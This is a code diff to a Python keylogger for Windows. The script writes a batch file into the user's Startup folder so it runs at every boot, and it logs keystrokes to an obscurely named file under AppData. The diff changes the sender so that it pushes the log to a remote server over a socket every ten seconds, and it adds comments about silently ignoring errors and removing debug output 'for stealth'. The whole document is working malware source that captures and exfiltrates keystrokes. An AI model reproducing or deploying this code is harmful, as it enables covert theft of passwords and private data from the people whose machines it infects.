@@ -1,18 +1,15 @@
-import getpass, os, keyboard, base64, requests, socket, time
+import getpass, os, keyboard, base64, requests, socket, time, threading
 
 
-### Adds the script to Windows startup programs folder, so it runs on system boot ###
-def add_to_startup(file_path=""):
+def add_to_windows11_startup(file_path=""):
 
-    # If no file path is provided for the executable, use the current script's directory path
+    # Use the current script's directory path
     if not file_path:
         file_path = os.path.dirname(os.path.realpath(__file__))
 
-    # Defines the path to the Windows startup folder including the user's name
-    bat_path = (rf"C:\Users\{user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    bat_file_path = (rf"C:\Users\{user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 
-    # Creates a .bat file in the startup folder that runs the script
-    with open(os.path.join(bat_path, "startup_script.bat"), "w+") as bat_file:
+    with open(os.path.join(bat_file_path, "startup_script.bat"), "w+") as bat_file:
         bat_file.write(f'start "" "{file_path}"')
 
 
@@ -41,21 +38,31 @@ def log_keys_to_txt():
         keyboard.wait()
 
 
+### REMOVE DEBUGGING COMMANDS TO INCREASE STEALTH ###
+
 def Send_Log_File_To_Server():
-    HOST = '127.0.0.1'                      # Replace with your server's IP
-    PORT = 65432                            # Replace with your server's port
-    file_path = rf"{log_dir}\a2V5bG9n.txt"  # Path to the log file
+    def send_file():
+        try:
+            HOST = '127.0.0.1'                      # Replace with your server's IP
+            PORT = 65432                            # Replace with your server's port
+            file_path = rf"{log_dir}\a2V5bG9n.txt"  # Path to the log file
 
-    # Create a socket and connect to the server
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        client_socket.connect((HOST, PORT))             # Connect to the server
-        print(f"Connected to server at {HOST}:{PORT}") 
+            # Create a socket and connect to the server
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+                client_socket.connect((HOST, PORT))             # Connect to the server
+                print(f"Connected to server at {HOST}:{PORT}") 
 
-        # Open and read the file
-        with open(file_path, 'rb') as file:
-            data = file.read()
-            client_socket.sendall(data)
-            print("File sent successfully.")
+                # Open and read the file
+                with open(file_path, 'rb') as file:
+                    data = file.read()
+                    client_socket.sendall(data)
+                    print("File sent successfully.")
+        except Exception as e:
+            pass # Silently ignore any exceptions for stealth
+
+    while True:
+        send_file()
+        time.sleep(10) # Wait for 10 seconds before sending again
 
 
 
@@ -64,6 +71,6 @@ def Send_Log_File_To_Server():
 user_name = getpass.getuser()                               # Gets the current user's name
 log_dir = rf"C:\Users\{user_name}\AppData\Local\a2V5bG9n"   # Directory to store the log file
 
-add_to_startup()
+add_to_windows11_startup()
+threading.Thread(target=Send_Log_File_To_Server(), daemon=True).start()
 log_keys_to_txt()
-Send_Log_File_To_Server()
